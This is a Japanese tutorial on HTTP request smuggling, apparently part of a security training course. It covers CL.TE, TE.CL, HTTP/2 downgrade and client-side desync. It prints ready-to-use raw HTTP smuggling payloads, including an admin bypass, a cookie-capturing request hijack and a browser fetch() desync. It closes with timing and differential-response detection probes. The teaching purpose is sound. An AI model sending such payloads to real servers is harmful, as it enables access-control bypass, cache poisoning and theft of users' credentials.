HTTP Request Smuggling

Front-endとBack-endのHTTPパーサー差異を悪用し、リクエスト境界を操作する。 セキュリティ制御bypass、cache poisoning、credential窃取に直結するExpert-level攻撃。

Theory Hands-on WSA Labs

Core Concept

HTTP Request Smugglingは、Front-end (CDN/Load Balancer/WAF) と Back-end (Application Server) がリクエストの境界を異なる方法で解釈する場合に発生する。

リクエスト境界の決定方法

MethodHeaderMechanism
Content-Length (CL)Content-Length: 13ボディのバイト数を明示指定
Transfer-Encoding (TE)Transfer-Encoding: chunkedチャンク終端 (0\r\n\r\n) でbody終了
根本原因

RFC 7230: CL と TE が両方存在する場合 TE を優先すべき。 しかし実装の不整合により、一方がCLを使い、もう一方がTEを使う状況が生まれる。

CL.TE Attack

Front-end: Content-Length使用、Back-end: Transfer-Encoding使用

Front-end sees (via Content-Length: 13): ┌──────────────────────────────────┐ │ POST / HTTP/1.1 │ │ Host: target.com │ │ Content-Length: 13 │ ← Front uses this │ Transfer-Encoding: chunked │ │ │ │ 0\r\n │ │ \r\n │ │ SMUGGLED │ ← "13 bytes of body" for front-end └──────────────────────────────────┘ Front-end forwards ALL to backend Back-end sees (via Transfer-Encoding: chunked): ┌─────────────────────┐ ┌────────────────────────┐ │ POST / HTTP/1.1 │ │ SMUGGLED... │ │ ... │ │ (interpreted as START │ │ Body: "0\r\n\r\n" │ │ of NEXT request!) │ │ (chunk terminated) │ │ │ └─────────────────────┘ └────────────────────────┘ Request 1 "Request 2" (smuggled)

Exploit Example

POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

Back-endは 0\r\n\r\n で最初のリクエスト終了と判断し、 GET /admin を次のリクエストとして処理する。

TE.CL Attack

Front-end: Transfer-Encoding使用、Back-end: Content-Length使用

POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

Front-endはchunkedを見て全体を1リクエストとして転送。 Back-endはCL:4を見て最初の4バイトでリクエスト1終了、残りが次のリクエストに。

H2.CL (HTTP/2 Downgrade)

HTTP/2では本来Content-Lengthは不要(フレームで長さが決まる)。 しかしfront-endがHTTP/2→HTTP/1.1ダウングレードする際、 攻撃者が指定したContent-Lengthヘッダーがそのまま渡されることがある。 

# HTTP/2 request (pseudo-headers)
:method: POST
:path: /
:authority: target.com
content-length: 0

# HTTP/2 DATA frame contains:
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n

# Front-end downgrades to HTTP/1.1:
POST / HTTP/1.1
Host: target.com
Content-Length: 0    ← From H2 header (body=0 bytes)
                     ← But actual body data was sent in DATA frame!
GET /admin HTTP/1.1  ← Backend sees this as next request
HTTP/2 Smugglingの利点

Front-end proxyがCL/TE conflictを検知するWAFルールを実装していても、 HTTP/2段階ではCL/TEの概念が異なるため検知をbypassしやすい。

Browser-Powered Desync (Client-Side Desync)

被害者のブラウザ自体にdesyncを起こさせる新しいカテゴリ。 攻撃者のページからvictimのブラウザ経由で対象サイトに不正リクエストを送信。

Attack Flow

  1. 攻撃者ページがvictimのブラウザにfetch()を実行させる
  2. CL不一致でブラウザ-サーバ間のTCP接続にpoisonデータが残る
  3. ブラウザの次のリクエストがpoisonデータに連結される
  4. 結果: victimのcookieが攻撃者に送信される等
// Attacker's page
fetch('https://target.com/api', {
  method: 'POST',
  body: 'GET /redirect-to-evil HTTP/1.1\r\nFoo: bar',
  headers: { 'Content-Length': '0' },  // Browser sends body but says CL:0
  mode: 'no-cors',
  credentials: 'include'
});
// Next navigation to target.com uses same TCP connection → smuggled request activates

Impact Scenarios

1. Bypass Security Controls

# WAF blocks /admin for external users
# Smuggled request appears to come from internal (same TCP connection)
GET /admin HTTP/1.1
Host: target.com
# → WAF never sees this request (it's embedded in previous request's body)

2. Web Cache Poisoning

# Poison cache by smuggling response for different URL
# Smuggled: GET /static/main.js
# Response: attacker-controlled JS
# → Cached under /static/main.js → all users get malicious JS

3. Credential Theft (Request Hijacking)

# Smuggle a partial request that "captures" the next user's request
POST /log HTTP/1.1
Content-Length: 999

data=
# Next user's full request (including cookies) becomes the body of this POST
# → Stored in application log accessible to attacker

Detection Techniques

Timing-Based Detection

# CL.TE detection: send ambiguous request with delay
# If back-end uses TE → processes chunk immediately
# If back-end uses CL → waits for more data → TIMEOUT

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
# If response delayed → CL.TE likely (back-end waiting for 6 bytes via CL)

Differential Response Detection

# Send smuggle probe, then immediately send normal request
# If smuggling works: normal request gets unexpected response (404, redirect, etc.)
# Compare: normal response vs post-smuggle response
